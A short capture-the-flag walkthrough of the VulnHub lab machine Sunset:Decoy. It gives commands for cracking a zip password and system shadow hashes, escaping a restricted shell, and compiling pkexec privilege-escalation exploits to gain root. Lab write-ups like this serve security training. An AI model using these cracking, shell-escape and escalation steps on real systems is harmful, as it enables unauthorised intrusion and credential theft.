

# Sunset:Decoy Walkthrough

**VulnHub Link:** [Sunset:Decoy](https://www.vulnhub.com/entry/sunset-decoy,505/)
**Difficulty:** Easy  
**Release Date:** 7 Jul 2020

---

## 1. Reconnaissance

### Nmap Scan

nmap -A -O -T4 -P -sV 192.168.100.181



## 2.Enumeration
```bash
wget http://192.168.100.181/save.zip
```
we obtain only file which is save.zip and need to find password to unzip

```bash
zip2john save.zip > zip.hash
```

first , we changed it to hash value

```bash
grep -o '\$pkzip\$.*\/pkzip\$' zip.hash > clean.hash\n
hashcat -m 17225 clean.hash /usr/share/wordlists/rockyou.txt\n
```
then we converted it to a form that hashcat cat crack it 

and boom -->

unzip save.zip (password manuel)

```bash
unshadow passwd shadow > crackable.hash
john --wordlist=/usr/share/wordlists/fasttrack.txt crackable.hash 
```

(password found) server which user is = 296640a3b825115a47b68fc44501c828

```bash
ssh 296640a3b825115a47b68fc44501c828@192.168.100.181
```

now , we have rbash which is restricted bash to prevent commands 

```bash
honeypot.decoy
7
:set shell=/bin/bash
:set
:shell
```

we did it but not finished yet

```bash
export PATH=/bin/:/usr/bin:/usr/local/bin:$PATH
```

and booom --> we excaped from rbash and user flag capturee

## 3.Privilege Escalation

```bash
find / -perm /4000 2>/dev/null
```

observe that pkexec vuln exist

we need two exploit script which you can download from both exploit-db and my github account

```bash
gcc -shared -o evil.so -fPIC evil-so.c
gcc exploit.c -o exploit
./evil.so
./exploit
```

### BINGO !!! ROOT SESSION OPENED AND FLAG CAPTURED
